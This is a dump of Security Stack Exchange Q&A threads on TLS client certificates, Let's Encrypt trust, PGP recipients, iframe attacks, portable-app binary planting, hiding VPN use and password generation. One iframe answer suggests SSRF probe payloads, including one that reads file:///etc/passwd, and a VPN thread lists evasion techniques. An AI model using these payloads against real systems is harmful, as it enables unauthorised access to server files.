<p>Based on your post I really don't think red teaming would be a good fit for you. You may find that less technical roles likes risk, pre-sales and the like may be a better fit to avoid the coding aspect.</p>
","2"
"265088","265088","Job prospects for Red Teaming in cloud security?","<p>I want to make my career in cyber security, but am confused which field to choose. According to this Burning Glass report,</p>
<p><a href=""https://www.burning-glass.com/wp-content/uploads/2020/10/Fastest_Growing_Cybersecurity_Skills_Report.pdf"" rel=""nofollow noreferrer"">https://www.burning-glass.com/wp-content/uploads/2020/10/Fastest_Growing_Cybersecurity_Skills_Report.pdf</a></p>
<p>Cloud security is 2nd most demanded field with least supply. <em>I don't care about Application security because I hate coding.</em> The report doesn't contain any information about red team, but I have strong interest in this field. Can anyone tell <strong>its demand and supply with comparison to cloud security?</strong></p>
","1","3","266617","<p>If you &quot;hate coding&quot;, then it's best to pick the 3rd most in demand skill according to the report - Risk Management.</p>
<p>Cloud security will require software programming skills to do automation, whereas Red teaming will also require coding skills to develop custom tools for offensive purposes.</p>
","1"
"265073","265073","Is it OK to use client TLS certificate for site login instead of username/password?","<p>Is it OK to just use a client's TLS certificate as a way of logging in to a website? What are the drawbacks? Is there any real system doing it?</p>
<p>Normally, there is mutual client/server TLS authentication plus the user's username/password for the webpage. I am asking if username/password can be replaced by a client certificate.</p>
","3","3","265074","<p>Mutual TLS authentication is great for validating two endpoints over the network, but it becomes an issue when you have to grant access rights to users and roles. Unless of course you are tying the client certificates to users in some way, but usually you would incorporate a username/password scheme for assigning access rights within a web application.</p>
<p>If you just want to have strong authentication to your web server for providing static content this is sufficient. If you need to incorporate user-based ACL's, you'll need to incorporate that into your design.</p>
","2"
"265073","265073","Is it OK to use client TLS certificate for site login instead of username/password?","<p>Is it OK to just use a client's TLS certificate as a way of logging in to a website? What are the drawbacks? Is there any real system doing it?</p>
<p>Normally, there is mutual client/server TLS authentication plus the user's username/password for the webpage. I am asking if username/password can be replaced by a client certificate.</p>
","3","3","265075","<p>In my opinion, mTLS should not be used for webapp authentication:</p>
<ul>
<li>When a user loses access to his certificate, or it is compromised, this certificate needs to be revoked. To best of my knowledge, it requires to keep a revocation list, and you cannot delete entries or archived this list. This list needs to be in cache to check with every login certificate. It can be an scalability issue when your website has more users. Also, think about a bad actor who can run a script to continuously request &quot;change certificate&quot;!!!. However, entries in revocation list can be deleted if certificate expiry date is set, but then this requires a certificate rotation stratergy, which brings more issues.</li>
<li>It might hinder user experience if they want to access website on multiple devices as they need to somehow have an existing/new certificate for a new device.</li>
<li>To completely log out from the website on a device, an user also needs to delete the certificate. This extra step might be missed (they forget, or they don't know how to do it in Android/IOS), which exposes user to security issue.</li>
</ul>
","-3"
"265073","265073","Is it OK to use client TLS certificate for site login instead of username/password?","<p>Is it OK to just use a client's TLS certificate as a way of logging in to a website? What are the drawbacks? Is there any real system doing it?</p>
<p>Normally, there is mutual client/server TLS authentication plus the user's username/password for the webpage. I am asking if username/password can be replaced by a client certificate.</p>
","3","3","267486","<p>Password authentication may be replaced with client TLS authentication. Comparison of client TLS authentication and password authentication:</p>
<ul>
<li>Client TLS authentication is less susceptible to social engineering.</li>
<li>Client TLS authentication is not susceptible to brute force.</li>
<li>Password authentication is less secure if you implement it from scratch for your website. This is a special case of the rule “Don't roll your own security”.</li>
<li>Login procedure is simpler with client TLS authentication.</li>
<li>The backup procedure for client TLS authentication is essentially the same as for password authentication, but differs in technical details. Here I assume that a typical user logs in to many websites. A user can't remember passwords for all those websites, so they store them in a password manager. With password authentication, the user backs up the password manager database. With client TLS authentication, they back up the TLS key database. With password authentication, a backup is needed every time a user creates a website account (hence a new password is added), but with client TLS authentication, the user can use the same client TLS key pair with <strong>all</strong> websites.</li>
<li>Client TLS authentication is unfamiliar both to programmers and users, so you will be a pioneer, educating them and fixing bugs and GUI defects in web libraries and web browsers.</li>
</ul>
<p>There was a concern in the comments that client TLS authentication ties a user account to a device, in other words, at most one user can authenticate from one computer. In fact, almost all OSes allows creating several OS user accounts, and every OS user account has its own TLS key database, so it can log in as a separate website user. Of course, it's possible that two users share an OS user account, but it's inconvenient and insecure and shouldn't be done regardless of whether it's used to log in to websites or not.</p>
<p>I heard that client TLS authentication is used on financial websites and admin panels. Personally, I didn't encounter it on websites except for WebMoney. Note that TLS can be used and is used under the hood in clients which aren't web browsers, that is, in specialized programs like messengers, bank clients, etc. I believe that client TLS authentication is used there quite often.</p>
<p>I think that the situation with client TLS authentication on websites is sad. Client TLS authentication is so rare that programmers don't know about it and reinvent the wheel.</p>
<p>I guess that the reason for this situation is that password authentication was more convenient <strong>in the past</strong>. Users could just store passwords in their heads because they had few website accounts. It's not possible with client TLS keys. That users shared OS user accounts may have played a role (see above why). Then the number of website accounts per user increased. Users started reusing passwords. The value of website accounts increased. Account hacking intensified. Password managers were invented. You know the rest of the story.</p>
","1"
"265066","265066","Reasons to distrust Let's Encrypt certificates","<p>We have a service running behind https and we are using SSL certificates from Let's Encrypt. The problem is that one of our clients distrusts Let's Encrypt CA and on certificate renewal it requires to us to send the newly generated certificate in order to add it to the trust chain.</p>
<p>Is this a common practice?</p>
<p>Which are the reasons to distrust certificates from Let's Encrypt?</p>
","45","3","265067","<p>This is an old policy.</p>
<p>Getting a certificate was difficult and expensive, which prevented malicious people from getting it, which made it an easy way to identify &quot;trusted&quot; sites.</p>
<p>Because LE allows anyone to get a certificate, then it allows malicious people to get a certificate and get that &quot;green lock&quot; and the symbol of &quot;trust&quot;. In response, some organisations added a rule to not accept LE certificates so that sites that used them would not be &quot;trusted&quot;.</p>
<p>As misguided as this is.</p>
<p>Very large corporate sites now use LE, so this policy makes no sense.</p>
<p>So, I would work with the client to change their policy. From my experience, organisations that added this rule quickly rescinded it and I have not heard of an organisation with it still in place.</p>
","80"
"265066","265066","Reasons to distrust Let's Encrypt certificates","<p>We have a service running behind https and we are using SSL certificates from Let's Encrypt. The problem is that one of our clients distrusts Let's Encrypt CA and on certificate renewal it requires to us to send the newly generated certificate in order to add it to the trust chain.</p>
<p>Is this a common practice?</p>
<p>Which are the reasons to distrust certificates from Let's Encrypt?</p>
","45","3","265148","<p>There are <a href=""https://www.digicert.com/difference-between-dv-ov-and-ev-ssl-certificates"" rel=""noreferrer"">three classes of certificates</a>:</p>
<ul>
<li>Domain Validated (DV)</li>
<li>Organization Validated (OV)</li>
<li>Extended Validation (EV)</li>
</ul>
<p>Domain validated certs are just that: you simply need to demonstrate control over a domain e.g. by a presenting a specific HTTP resource.</p>
<p>For OV and EV, there are additional requirements of the CA to verify ownership of the domain.  An EV certificate requires the most proof.  It requires proof of identity of the requestor and verification of their employment at the company that owns the domain.</p>
<p>As you have likely surmised if you are familiar with Let's Encrypt, it issues Domain Validated certs.</p>
<h1>Why might a company not accept a DV certificate?</h1>
<p>I think the most illustrative example of the potential risk of DV certs (relative to OV and EV certs) is an <a href=""https://www.wired.com/2017/04/hackers-hijacked-banks-entire-online-operation/"" rel=""noreferrer"">attack against a Brazilian Bank</a> and its customers that involved the attackers issuing Let's Encrypt certificates for the bank's domain.</p>
<p>In a nutshell, the attackers compromised a DNS registrar account for the bank.  This allowed them to register IPs under their control to the banks domain.  They then used this to get Let's Encrypt issued certificates for the domain.  When customers then went to their bank's website, they were directed to a proxy site which presented a 100% valid certificate for the bank.</p>
<p>Requiring an OV or EV certificate prevents/mitigates the above approach.  Getting a fraudulent certificate of these classes would require much more effort and risk on the part of the attackers than simply remotely gaining control of a single account.</p>
<p>Unfortunately (IMO) browsers have moved away from distinguishing between these and more and more people assert that DV certs are just as good as OV and EV certs.</p>
<p>I think there may be some confusion as to how this applies to the original question.  If my company wants to call web services that your company hosts (or I require mTLS for you to call mine), my servers are going to be configured to point to a specific endpoint.  There's no browser or lock icon involved.  When my client calls the webservice, it will verify that the certificate is good and in this case, that it's an EV cert from a CA I trust.  If an attacker is able to take control of my DNS, they can add a new host and get me to go there but unless they have a valid cert for the domain, the call will terminate before any data is passed.  If I allow DV certs, it's game over: the attacker simply get's an LE cert and my web service client will happily transmit data to the attacker's server.</p>
<blockquote>
<p>certificate renewal it requires to us to send the newly generated certificate in order to add it to the trust chain</p>
</blockquote>
<p>This is called 'certificate pinning'.  The reason they are insist on this is that if someone were to issue a fraudulent DV cert from LE, they would not trust it.  They are depending on a trusted representative of your company to verify its authenticity.  Likely, they are in a situation that if they trust LE as a CA, they become vulnerable to these domain-based/DV attacks on all of their similar dependencies.  It occurs to me that using LE to sign your certificate is pointless here.  It's essentially a self-signed cert.</p>
","8"
"265066","265066","Reasons to distrust Let's Encrypt certificates","<p>We have a service running behind https and we are using SSL certificates from Let's Encrypt. The problem is that one of our clients distrusts Let's Encrypt CA and on certificate renewal it requires to us to send the newly generated certificate in order to add it to the trust chain.</p>
<p>Is this a common practice?</p>
<p>Which are the reasons to distrust certificates from Let's Encrypt?</p>
","45","3","265149","<p>SSL certificate doesn't confirm validity, reliability or credibility of the related party. It has sole purpose of encrypting data transaction between two terminals. (Like one being a server which hosts a web site and another one being your browser by which you browse that website.) (A note: there is also Extended Validation (EV) SSL but that's another point.)</p>
<p>So there is absolutely no reason to distrust Let's Encrypt SSL because there is <strong>absolutely nothing different</strong> between Let's Encrypt and any other certificates you paid for, in terms of what they do.</p>
<p>And for that matter, there is also nothing different between <strong>self-signed certificate</strong> and any SSL you bought. For example there are many public and government intranet applications which use their self-signed certificates, just to encrypt data between terminals. In the end, <strong>if you can trust yourself, then you can issue yourself a certificate</strong>, can't you? Your application can perfectly work with this certificate just like it would with Let's Encrypt or a paid one.</p>
<p>The only difference with using your own-forged (i.e. self-signed) certificate is that your system will probably require you to store your Certificate Authority (CA) certificate in the certificate pool of your system; because the system won't recognize you as a CA automatically. Systems are set to use a predefined list of these authorities to &quot;automatically trust&quot; the certificates they issue. This is the only difference.</p>
<p>I am not saying &quot;you can use self-signed certificates in your web site&quot;. And I am not saying we can use our own certificates and everyone should add us as a CA in their pools. I am just saying there is no technical difference in the certificate. As there are many intranet applications of which the authority usually asks you to add them as a trusted CA in the user's pool. Like for example a government agency uses a self-signed certificate for their application and asks their users to download and include their CA certificate in their pools. I know some entities do it for even public applications.</p>
<p>If your client had an old system which required more manual work, once they add Let's Encrypt as CA in their system, they shouldn't be asking you to send the certificate each time after renewal; because their system should recognize the issuer already. There must be something very specific to their system. So no, it's not common practice.</p>
<p>You can understand from here that it is not important that the browser is warning you that your certificate is insecure. Because it doesn't actually warn you about the certificate itself; it is warning you that it didn't recognize the issuer. (Of course we are talking about a valid self-signed certificate here.) To test this, just change your computer date to 50 years from now. And refresh this very page and <strong>your browser will tell you the certificate of Stack Exchange, this very site, is insecure</strong>. Well, is it? It was secure a second ago? The site and the certificate didn't change; but the browser recognized the validity period and thought that it is expired.</p>
<p>This is also why you don't usually use self-signed certificates on web sites. Because you can't hardcode yourself as a CA on the browser's list. That's the only reason why you wouldn't use it; but as you see, there is technically no reason why you can't.</p>
<p>To sum up, let alone distrusting Let's Encrypt, I think that it is a very very long overdue that the internet community didn't have it before. Free and automated SSL certificates should have been a standard years ago.</p>
","-1"
"265041","265041","Can secret recipients be included in PGP cryptography","<p>Can we be sure that a cleartext message that becomes encrypted by pgp or openpgp which is intended for one-or-more specific recipients doesn't also get secretly decipherable by a third party? Since i understand we can target multiple recipients when ciphering, how do i know software isn't adding extra recipients for, like, shadow govt type stuff. If openpgp is open source, I'd think it would be known that it's not so private</p>
","0","3","265042","<p>The whole idea of open source applications is that you can see for yourself that the program isn't doing something malicious. Kleopatra is a fantastic application for PGP encrypting your messages.</p>
","0"
"265041","265041","Can secret recipients be included in PGP cryptography","<p>Can we be sure that a cleartext message that becomes encrypted by pgp or openpgp which is intended for one-or-more specific recipients doesn't also get secretly decipherable by a third party? Since i understand we can target multiple recipients when ciphering, how do i know software isn't adding extra recipients for, like, shadow govt type stuff. If openpgp is open source, I'd think it would be known that it's not so private</p>
","0","3","265043","<p>First, PGP is opensource. You probably will not inspect the sourcecode, but someone will. The history of the changes are kept, so if the code had some backdoor at some time, it would be public that the backdoor was added and later removed. If you don't trust the distributed binary, you can (relatively) easily download the source and compile yourself.</p>
<p>Second, good crypto follows <a href=""https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"" rel=""nofollow noreferrer"">Kerckhoffs's principle</a>: everything is known except the key. PGP does not uses any secret or hidden function. All the functions and methods used are public, they are on the source code.</p>
<p>PGP was created to make easy to people to use encryption, and Phil Zimmerman, his creator, <a href=""https://en.wikipedia.org/wiki/Phil_Zimmermann"" rel=""nofollow noreferrer"">got in trouble with the government</a> because of it. He is a known privacy advocate.</p>
","0"
"265041","265041","Can secret recipients be included in PGP cryptography","<p>Can we be sure that a cleartext message that becomes encrypted by pgp or openpgp which is intended for one-or-more specific recipients doesn't also get secretly decipherable by a third party? Since i understand we can target multiple recipients when ciphering, how do i know software isn't adding extra recipients for, like, shadow govt type stuff. If openpgp is open source, I'd think it would be known that it's not so private</p>
","0","3","265060","<p>There are multiple subtle ways in which a program such as PGP could be backdoored. But assuming just the threat scenario of an additional recipient (such as the one you could add yourself with a <code>encrypt-to</code> setting on your gpg.conf) it's simple to verify.</p>
<p>First we should refresh how openpgp public key cryptography works:</p>
<ul>
<li>The openpgp client generates a random key, called &quot;session key&quot;</li>
<li>This session key is encrypted for each of the recipients with their public key</li>
<li>The message is encrypted with the session key using a symmetric algorithm</li>
<li>The output of the last two steps is the resulting encrypted file</li>
</ul>
<p>On decryption, the reverse steps are followed:</p>
<ul>
<li>The openpgp client iterates all the Public-Key Encrypted Session Key Packets, looking for one tagged as being encrypted to the Key ID of your public key (any of them, if you have several ones).</li>
<li>The client recovers the session key using the private key of the user</li>
<li>The message is decrypted withe the session key</li>
</ul>
<p>It is possible to use &quot;hidden recipients&quot;. These are just recipients for which the Public-Key Encrypted Session Key Packets don't include the recipient Key ID (a Key-ID of 0 is stored instead), so it's not obvious to who else is encrypted the message. In order to figure out if it is intended for its key, the client must attempt to decrypt it with each of its keys. But overall, it's not different to the normal case.</p>
<p>You can view the OpenPGP packets with either <code>pgpdump</code> or <code>gpg --list-packets</code>.</p>
<p>A normal encrypted file/message will contain one <a href=""https://www.rfc-editor.org/rfc/rfc4880#section-5.1"" rel=""nofollow noreferrer"">Public-Key Encrypted Session Key Packet</a> per recipient plus a <a href=""https://www.rfc-editor.org/rfc/rfc4880#section-5.13"" rel=""nofollow noreferrer"">Symmetrically Encrypted Integrity Protected Data Packet</a> (a <a href=""https://www.rfc-editor.org/rfc/rfc4880#section-5.7"" rel=""nofollow noreferrer"">Symmetrically Encrypted Data Packet</a> instead would be an option, but everything should support MDC nowadays).</p>
<p>By counting the number of Public-Key Encrypted Session Key Packets included, you can know the number of recipients for a given file (even though you may not know <em>who</em> they are).</p>
<p>If you client added secret recipients, they would show up in the file having more Public-Key Encrypted Session Key Packets than recipients.</p>
<p>(or if they replaced a recipient with the key of a third party, that would be detectable as well, as that recipient would be unable to decrypt it)</p>
<p>Please note that if you are including yourself so that you can decrypt the files, you are also considered a recipient (e.g. if you encrypt a file for Alice and Bob, and you have enabled the setting to encrypt to yourself, the total number of recipients is <em>three</em>)</p>
<p>Obviously, an inspection of the encrypted message should be done with a <a href=""https://dl.acm.org/doi/10.1145/358198.358210"" rel=""nofollow noreferrer"">trusted program</a>, since a trojanized client that added a secret recipient could be skipping it when listing the recipients. The task can be easily performed on a different machine, though, and it's not too hard to perform that manually from an hex view, even.</p>
","1"
"264953","264953","What XSS attacks could somebody perform through an iframe?","<p>If a potential attacker was able to upload a cross-origin <code>&lt;iframe&gt;</code> element to your website as a post of some sort, what could they actually do through it? I know that cross-origin <code>&lt;iframe&gt;</code> elements are able to do simple stuff like using JavaScript's <code>alert()</code> method, but what else could they do to the page it was uploaded to?</p>
","0","3","264958","<p>Have you tried any server request? <code>&lt;iframe src=//yourserver.ping&gt;&lt;/iframe&gt;</code> or  <code>&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;</code> give a try you might get easy SSRF.</p>
","1"
"264953","264953","What XSS attacks could somebody perform through an iframe?","<p>If a potential attacker was able to upload a cross-origin <code>&lt;iframe&gt;</code> element to your website as a post of some sort, what could they actually do through it? I know that cross-origin <code>&lt;iframe&gt;</code> elements are able to do simple stuff like using JavaScript's <code>alert()</code> method, but what else could they do to the page it was uploaded to?</p>
","0","3","264963","<p>This malicious embedded bad pixel / iframe plant gets to a) know if it is running inside an iframe, the referrer, and therefore either pop out / create a pop up top level window, (breaking free of the sniffer also if you swap roles) or shutdown or redirect etc. b) is treated as tainted memory and can be extremely firewalled with the right CORS headers, but also if you allow script-src: * or be silly you probably could get into trouble. The only way to move things between the two is using a message passing thing - service workers which can only send textual signals probably filter weird characters out and are rate limited (after 30 seconds its harder to exfiltrate large chunks via this pipe).</p>
<p>A regular script tag embedded in the body of the main page would be much more dangerous - it could log all keystrokes and monitor all interactions and everything clicked. Maybe jam a javascript into a SVG that acts like an image? Tricky.</p>
","1"
"264953","264953","What XSS attacks could somebody perform through an iframe?","<p>If a potential attacker was able to upload a cross-origin <code>&lt;iframe&gt;</code> element to your website as a post of some sort, what could they actually do through it? I know that cross-origin <code>&lt;iframe&gt;</code> elements are able to do simple stuff like using JavaScript's <code>alert()</code> method, but what else could they do to the page it was uploaded to?</p>
","0","3","264970","<p>Assuming the iframe isn't sandboxed (via the optional HTML attribute), the main thing that it could do (aside from displaying / playing content you might not want shown to the user / associated with your site) is use top-level navigation to go from the legit page (where the iframe is hosted) to a spoofed, look-alike page with a similar domain. However, the attacker completely controls this spoofed page. They can now try to trick the user into interacting with it as though it's your own, trusted page. Examples include stealing credentials (phishing), authorizing access to third-party services like Google, capturing content that you type or upload, or tricking users with plausible-seeming misinformation.</p>
<p>The main other thing that an iframe can attempt is window messaging (that is, using <code>window.postMessage()</code>) to try and attack the parent page. Obviously this only works if the parent is</p>
<ul>
<li>Listening for (has set up an event handler for) window messages</li>
<li>Is either not filtering the origin of the messages or expects them from the iframed site</li>
<li>Is either not filtering the source window of those messages or expects them from the iframe</li>
<li>Can be meaningfully exploited via a maliciously crafted window message</li>
</ul>
<p>and none of those are at all guaranteed. However, it could be attempted, since unlike most cases, the untrusted page has a <code>Window</code> object (specifically, <code>window.parent</code>) for the target site.</p>
<p>Otherwise, there's basically nothing that a cross-origin iframe can do to the parent page directly. Same origin policy for iframes is pretty strong by default. For example, even though top-level navigation is allowed by default, the iframe can't get the parent page's URL. Nor can it navigate to e.g. a <code>javascript:</code> URI, which would execute in the context of the parent page.</p>
<hr />
<p>Note that if you're considering doing this, you really should take advantage of iframe sandboxing anyhow. The <a href=""https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox"" rel=""nofollow noreferrer""><code>sandbox</code> attribute</a> is useful for adding additional restrictions to the content in an iframe, either beyond what same-origin policy already enforces, or even making iframes that are actually same-origin have restricted permissions. It's optional (without it, the usual restrictions on cross-origin iframes still apply, though) but it's worth using for extra security. Note the list of restrictions that you can lift (through attribute values) if you want to consider some other things that iframed content may be able to do. (Note that many of those things are always blocked, both without <code>sandbox</code> and with the access specifically granted, for cross-origin sandboxes.)</p>
","1"
"264925","264925","Are portable apps vulnerable to binary planting?","<p>Several Windows apps come in both &quot;installer&quot; and &quot;portable&quot; forms, with the latter having the advantage that you can just download and run it from anywhere in the system.</p>
<p>Doesn't being able to run them from anywhere in the system mean that such apps are inherently vulnerable to <a href=""https://owasp.org/www-community/attacks/Binary_planting"" rel=""nofollow noreferrer"">binary planting</a> since an attacker with access to your system could at some point swap the downloaded app with a malicious executable? Isn't running code from anywhere but <code>C:\Program Files</code>, etc inherently dangerous? If it is, why don't we see this kind of attack all the time?</p>
","0","5","264927","<p>If an attacker has permissions to overwrite files within your homefolder, you've already lost.</p>
","2"
"264925","264925","Are portable apps vulnerable to binary planting?","<p>Several Windows apps come in both &quot;installer&quot; and &quot;portable&quot; forms, with the latter having the advantage that you can just download and run it from anywhere in the system.</p>
<p>Doesn't being able to run them from anywhere in the system mean that such apps are inherently vulnerable to <a href=""https://owasp.org/www-community/attacks/Binary_planting"" rel=""nofollow noreferrer"">binary planting</a> since an attacker with access to your system could at some point swap the downloaded app with a malicious executable? Isn't running code from anywhere but <code>C:\Program Files</code>, etc inherently dangerous? If it is, why don't we see this kind of attack all the time?</p>
","0","5","264928","<p>If your goal is to avoid executing potentially hostile code, you're better served with code signing that some poor man version of Trusted Path Execution. But in any case both are defeated by the presence of an executable interpreter (on purpose or not), which is the case on most systems not hardened to the point of unusability.</p>
","1"
"264925","264925","Are portable apps vulnerable to binary planting?","<p>Several Windows apps come in both &quot;installer&quot; and &quot;portable&quot; forms, with the latter having the advantage that you can just download and run it from anywhere in the system.</p>
<p>Doesn't being able to run them from anywhere in the system mean that such apps are inherently vulnerable to <a href=""https://owasp.org/www-community/attacks/Binary_planting"" rel=""nofollow noreferrer"">binary planting</a> since an attacker with access to your system could at some point swap the downloaded app with a malicious executable? Isn't running code from anywhere but <code>C:\Program Files</code>, etc inherently dangerous? If it is, why don't we see this kind of attack all the time?</p>
","0","5","264933","<ol>
<li><p>Installing means not unpacking. It can be much more complex, e.g. registration of components in the registry. You cannot reach that by just unpacking. That's why it is incorrect to say that <em>&quot;pretty much every Windows app&quot;</em> has a portable version.</p>
</li>
<li><p>&quot;C:\Program Files&quot; has no any special meaning from the security point of view. Launching executables from this directory is not safer than launching from any other directory. Besides, many installers allow to specifiy the destination directory, and you can install to any directory you want.</p>
</li>
<li><p>If the attacker can modify the downloaded portable app, then this attacker can modify the downloaded installer as well. Launching an infected installer has the same risk as launching a portable app.</p>
</li>
<li><p>If you carefully launch portable apps, this can be even <em>more safe</em> compared to installer. Installers require usually admin permissions to be able to write to the system directories like C:\Windows\System32 and to write to the registry. That's why users normally give such permissions. If you are logged in as a normal user, not an admin, and launch a portable app, you can better control the application. For instance, if you launch a simple text editor and it requires more permissions, e.g. to modify some system file, you can reject the request.</p>
</li>
</ol>
","1"
"264925","264925","Are portable apps vulnerable to binary planting?","<p>Several Windows apps come in both &quot;installer&quot; and &quot;portable&quot; forms, with the latter having the advantage that you can just download and run it from anywhere in the system.</p>
<p>Doesn't being able to run them from anywhere in the system mean that such apps are inherently vulnerable to <a href=""https://owasp.org/www-community/attacks/Binary_planting"" rel=""nofollow noreferrer"">binary planting</a> since an attacker with access to your system could at some point swap the downloaded app with a malicious executable? Isn't running code from anywhere but <code>C:\Program Files</code>, etc inherently dangerous? If it is, why don't we see this kind of attack all the time?</p>
","0","5","264993","<p>The logic behind the question is confusing, which is why I think you are having trouble getting answers or getting people to understand you.</p>
<p>Portable apps would be inherently <em>subject to</em> (I would not use the term &quot;vulnerable to&quot;) being swapped out for malicious versions without any elevation of privileges or installation. Because that's how they are supposed to work. So, that's a given, and we can assume that this is a factor.</p>
<blockquote>
<p>Isn't running code from anywhere but C:\Program Files, etc inherently
dangerous?</p>
</blockquote>
<p>&quot;inherently dangerous&quot;? Of course not. And this is where the logic starts to go astray. Having an approved directory structure where binaries should be executed is a handy, easy, simple, and predictable way to enforce binary execution policies. Some hardened systems do only allow binaries to be executed from a protected directory structure. But the ease of adding controls in one case does not mean that the other case is &quot;inherently dangerous&quot;.</p>
<p>Does being able to execute binaries from any arbitrary place in the system introduce weaknesses? Sure. It's more difficult to control what apps are approved. But not impossible.</p>
<blockquote>
<p>why don't we see this kind of attack all the time?</p>
</blockquote>
<p>Because it would have to be not a niche case to be relevant &quot;all the time&quot;.</p>
<p>The point of the attack would be to place the app in such a way that the user of the system would choose to run it as a normal part of the user's operating of the system. Because if the attacker could replace the app and execute it themselves, then why replace an existing app at all?</p>
<p>For this attack to make sense, an attacker would have to:</p>
<ul>
<li>have access to the system to be able to delete/replace the app, and if they could do that, there are far worse things they could do</li>
<li>know that the app would be executed by the user and not just &quot;hanging around&quot; for convenience, which brings an element of uncertainty and unpredictability for the attacker</li>
<li>create the malicious app in a way that would avoid anti-virus protections</li>
</ul>
<p>All of these factors are in the way of this being an issue &quot;all the time&quot;. Possible? Of course. But not a major or universal threat.</p>
","1"
"264925","264925","Are portable apps vulnerable to binary planting?","<p>Several Windows apps come in both &quot;installer&quot; and &quot;portable&quot; forms, with the latter having the advantage that you can just download and run it from anywhere in the system.</p>
<p>Doesn't being able to run them from anywhere in the system mean that such apps are inherently vulnerable to <a href=""https://owasp.org/www-community/attacks/Binary_planting"" rel=""nofollow noreferrer"">binary planting</a> since an attacker with access to your system could at some point swap the downloaded app with a malicious executable? Isn't running code from anywhere but <code>C:\Program Files</code>, etc inherently dangerous? If it is, why don't we see this kind of attack all the time?</p>
","0","5","264995","<p>Even attackers observe the gain/cost ratio.</p>
<p>Not every user uses portable apps. IMHO, the fact is the casual user ignores them. That means that you would invest in an attack having few possible targets. It terribly lowers the expected gain because it is the product of the number of possible target by the attack efficiency.</p>
<p>Portable apps can reside anywhere in the system including on removable media. It adds a complexity level, because you have to search for something without knowing where it is nor even if it is currently present. Furthermore, it could have been renamed at <em>installation</em> time, which adds a risk of not finding it even if it is present...</p>
<p>In the end, it is generally thought more efficient to propose <em>copies</em> of innocent apps, either portable or installable ones, but that have been specially crafted to contain malware code. It is easier than first gaining access to a system without even knowing whether the attack vector will be there.</p>
<p>Of course, if the considered threat is your little brother/sister attacking your system, they already have physical access to your system, and can know what tools you use. In that threat model, portable apps are a very easy attack vector, and if you use them you should protect them.</p>
","1"
"264764","264764","Hide VPN from ISP?","<p>We know that when you use a VPN, your ISP can't see what data is going inside the tunnel, but they can see that you are visiting the VPN server. Is it possible for the VPN to somehow configure your internet so that your ISP can't even see that you are using a VPN?</p>
","1","4","264765","<p>There's a few things that will allow your ISP to know you are using a VPN:</p>
<ol>
<li><p>The protocol that VPNs use: UDP. An ISP can filter your traffic and see if you move any data via this protocol; if you are, odds are you are using a VPN, although it could also be VoIP or a Google Meet, since they also use UDP.</p>
</li>
<li><p>VPN clients have default ports: OpenVPN uses 1194, WireGuard uses 51820, L2TP uses 500 and 4500, and so on.</p>
</li>
<li><p>The IP addresses of commercial VPNs, such as Mullvad or TunnelBear, are publicly known. If you make requests to these IPs, your ISP will know you are using a VPN.</p>
</li>
</ol>
<p>You could make your own VPN server on a VPS, which would allow you to bypass known IPs, but 1. and 2. would still apply.</p>
","-1"
"264764","264764","Hide VPN from ISP?","<p>We know that when you use a VPN, your ISP can't see what data is going inside the tunnel, but they can see that you are visiting the VPN server. Is it possible for the VPN to somehow configure your internet so that your ISP can't even see that you are using a VPN?</p>
","1","4","264858","<p>One could use DNSSEC to hide lookups, obfsproxy to try and trip up DPI, self managed VPNs hosted in a cloud using nonstandard ports and regularly changing IPs.  Likely would fly under automated flagging.</p>
<p>The brightest of bots would likely determine a home network which only ever connects to a single ip/port at a time for the bulk of it's traffic is using a VPN no matter the ip/port.  One could set up small computers to idly browse the internet and make the signal a bit noisier.  Might trip up all but human review.</p>
","0"
"264764","264764","Hide VPN from ISP?","<p>We know that when you use a VPN, your ISP can't see what data is going inside the tunnel, but they can see that you are visiting the VPN server. Is it possible for the VPN to somehow configure your internet so that your ISP can't even see that you are using a VPN?</p>
","1","4","268434","<p>When strictly just trying to hide it from the ISP then it is possible with some work: Tunnel the VPN connection through something else, like an SSH connection, to an endpoint under your control and establish the VPN from there.</p>
<p>Of course, the traffic identification issue is not gone but just moved from the ISP to whoever owns the infrastructure of the endpoint used as they can see the VPN traffic.</p>
<p>Obfuscating steps like the ones mentioned by @foreverska can be used here as well to lower the likelihood of routine detection. A targeted investigation will not be fooled.</p>
","1"
"264764","264764","Hide VPN from ISP?","<p>We know that when you use a VPN, your ISP can't see what data is going inside the tunnel, but they can see that you are visiting the VPN server. Is it possible for the VPN to somehow configure your internet so that your ISP can't even see that you are using a VPN?</p>
","1","4","268444","<p>The ISP will know the IP address of the initial receiver. That's unavoidable, because the ISP has to deliver your message somewhere. If your VPN uses one known IP address, then your ISP can know that you are sending to a VPN IP address (99.99% likelihood for VPN traffic, 0.01% that your own computer is sending to the wrong IP address). If the VPN server has multiple IP addresses, your ISP could know them all.</p>
<p>If your ISP doesn't recognise the IP address, they can look at the structure of your message. They shouldn't be able to gain any knowledge about the real message other than the size, but they may be able to conclude that your message is a VPN message sent to an unknown VPN server and be right very often.</p>
<p>Last, if all your traffic goes to one IP address only, then that fact alone makes it likely that you are using a VPN. And if the ISP cannot make sense of the message because it is encrypted, and it doesn't look like https, then it is likely to be VPN.</p>
<p>So what can you do? Pick a VPN server that doesn't use a known IP address and a protocol that can be recognised. (So nothing technical, just pick the right VPN server). And the protocol should be such that it doesn't look like anything encrypted. For example, you could map an encrypted message to grammatically correct sequence of English words and back. Or wrap the VPN message into something that looks like SSL. That's something the VPN server would have to support. And use different IP addresses throughout the day.</p>
","0"
"264698","264698","Why don't applications suggest passwords themselves?","<p>Imagine a web app that, on the login page, has a password field which does not allow user input, but just displays a client-only generated password that is reasonably strong, with a button to re-generate the password.</p>
<p>In this approach, instead of leaving it to the user to supply a strong password (either by typing it in or using a browser-suggested password), the app ensures that only strong passwords that meets it policy are used.</p>
<p>I wonder why this approach is not used. Apart from usability concerns with not allowing users to use their own passwords (mitigated by using a password manager or having the browser remember passwords), I think this approach should massively increase the security of apps.</p>
<p>What am I missing?</p>
","1","3","264705","<p>Short answer: the application does not have to choose the password, it should simply let the user choose but <strong>enforce complexity</strong>.</p>
<p>Implementing such a system means you are setting a <strong>maximum baseline</strong> for complexity. What if I want to use a password even longer and stronger than the application would suggest? I use a password manager, so I can afford that.</p>
<p>AFAIK most people are not using password managers. That means they actually type their passwords, and sometimes they rely on the browser to store them. But often, they have to access sites from another device where the password may not be stored, so for that reason they tend to choose passwords that they can remember, and that are not too long (and tedious) to type in.</p>
<p>This is a reality you will have to take into account.</p>
